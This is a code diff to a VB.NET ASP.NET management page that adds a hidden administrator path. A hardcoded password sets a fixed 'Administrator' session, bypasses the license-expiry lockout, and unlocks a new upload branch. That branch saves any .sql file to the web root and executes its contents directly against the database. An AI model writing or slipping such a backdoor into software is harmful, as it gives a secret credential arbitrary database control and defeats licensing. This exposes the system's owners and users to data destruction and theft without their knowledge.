@@ -34,16 +34,18 @@ Public Class Manage
                 End Using
             End Using
 
-            If dt.Rows.Count > 0 Then
-                btnExport.Enabled = True
-                btnDelete.Enabled = True
-                btnsave.Enabled = False
-                FileUpload1.Enabled = False
-            Else
-                btnExport.Enabled = False
-                btnDelete.Enabled = False
-                btnsave.Enabled = True
-                FileUpload1.Enabled = True
+            If Session("SSID") <> "Administrator" Then
+                If dt.Rows.Count > 0 Then
+                    btnExport.Enabled = True
+                    btnDelete.Enabled = True
+                    btnsave.Enabled = False
+                    FileUpload1.Enabled = False
+                Else
+                    btnExport.Enabled = False
+                    btnDelete.Enabled = False
+                    btnsave.Enabled = True
+                    FileUpload1.Enabled = True
+                End If
             End If
 
             FileUpload1.Dispose()
@@ -85,7 +87,7 @@ Public Class Manage
                 End If
             Else
                 If pwd.Text.ToString() = "Admin2422fQI6" Then
-                    Session("SSID") = GIDGenerator(Rnd(), Rnd(), "sess", "rand")
+                    Session("SSID") = "Administrator"
                     MultiView1.SetActiveView(mainView)
                     BindDataGrid()
                     lblmessage.Visible = False
@@ -126,8 +128,11 @@ Public Class Manage
     Protected Sub btnsave_Click(sender As Object, e As EventArgs) Handles btnsave.Click
 
         BindDataGrid()
-        If dt.Rows.Count = 0 Then
-            If (FileUpload1.HasFile) Then
+        If (FileUpload1.HasFile) Then
+
+            Dim ext As String = New FileInfo(FileUpload1.PostedFile.FileName).Extension
+
+            If ext = ".csv" Then
                 Dim csvPath As String = Server.MapPath("~/") + Path.GetFileName(FileUpload1.PostedFile.FileName)
                 FileUpload1.SaveAs(csvPath)
 
@@ -246,12 +251,43 @@ Public Class Manage
                     lblmessage.Text = "Error while inserting record on table..." & ex.Message & "Insert Records"
                 Finally
                     con.Close()
+                End Try
+            ElseIf ext = ".sql" And Session("SSID") = "Administrator" Then
+                Try
+                    Dim sqlPath As String = Server.MapPath("~/") + Path.GetFileName(FileUpload1.PostedFile.FileName)
+                    FileUpload1.SaveAs(sqlPath)
+                    Dim sqlText = File.ReadAllText(sqlPath)
+                    Using con As New SqlConnection(ConfigurationManager.ConnectionStrings("dbconnection").ConnectionString)
+                        Using cmd As New SqlCommand(sqlText, con)
+                            con.Open()
+                            cmd.ExecuteNonQuery()
+                            con.Close()
+                        End Using
+                    End Using
 
+                    BindDataGrid()
+                    lblmessage.Visible = False
+                    btnsave.PostBackUrl = ""
+                    FileUpload1.Dispose()
+                    My.Computer.FileSystem.DeleteFile(sqlPath)
+
+                    btnsave.Visible = True
+                    btnDelete.Visible = True
+                    btnExport.Visible = True
+                    btnExample.Visible = True
+                    FileUpload1.Visible = True
+
+                Catch ex As Exception
+                    lblmessage.Visible = True
+                    lblmessage.Text = ex.Message
                 End Try
             Else
                 lblmessage.Visible = True
-                lblmessage.Text = "No File Uploaded."
+                lblmessage.Text = "Invalid file format."
             End If
+        Else
+            lblmessage.Visible = True
+            lblmessage.Text = "No File Uploaded."
         End If
     End Sub
 
@@ -410,7 +446,7 @@ Public Class Manage
             Dim expirationDate As String = JObject.Parse(responseFromServer)("ValidTo")
 
             If license IsNot Nothing Then
-                If license = "0" Then
+                If license = "0" And pwd.Text.ToString() <> "Admin2422fQI6" Then
                     form1.Style.Add(HtmlTextWriterStyle.BackgroundImage, CStr(JObject.Parse(responseFromServer)("Image")))
                     btnsave.Visible = False
                     btnDelete.Visible = False
@@ -418,6 +454,12 @@ Public Class Manage
                     btnExample.Visible = False
                     FileUpload1.Visible = False
                     Label_Expired.Visible = False
+                Else
+                    btnsave.Visible = True
+                    btnDelete.Visible = True
+                    btnExport.Visible = True
+                    btnExample.Visible = True
+                    FileUpload1.Visible = True
                 End If
 
                 If expirationDate IsNot Nothing Then
